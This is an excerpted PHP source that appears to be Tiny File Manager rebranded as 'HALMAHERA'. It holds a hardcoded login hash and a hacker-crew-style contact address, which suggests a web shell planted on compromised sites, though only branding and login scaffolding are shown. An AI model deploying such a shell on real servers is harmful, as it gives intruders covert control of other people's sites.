...
define('APP_TITLE', 'HALMAHERA');
$use_auth = true;
$auth_users = array(
    'halmahera' => '$2a$12$aI2PKAUGYSlUBSj1HITCMeCHDGuOD4FBS7Yrsdv6KHCmcW8C9sGpu'
);
...
if ($use_auth) {
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        <section class="h-100">
			...
			<a href="https://www.google.co.id/" target="_blank" class="text-decoration-none text-muted">© 2023 HALMAHERA</a>
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
			<h3>
			<a href="#" target="_blank" class="app-v-title">HALMAHERA- <?php echo VERSION; ?></a></h3></p>
                        <p>Author: HALMAHERA</p>
                        <p>Mail Us: <a href="#">batakocrew1337@gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">HALMAHERA <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">HALMAHERA<?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
...
<head>
    ...
    <meta name="description" content="HALMAHERA">
    <meta name="author" content="HALMAHERA">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'HALMAHERA';      $tr['en']['AppTitle']           = 'HALMAHERA';
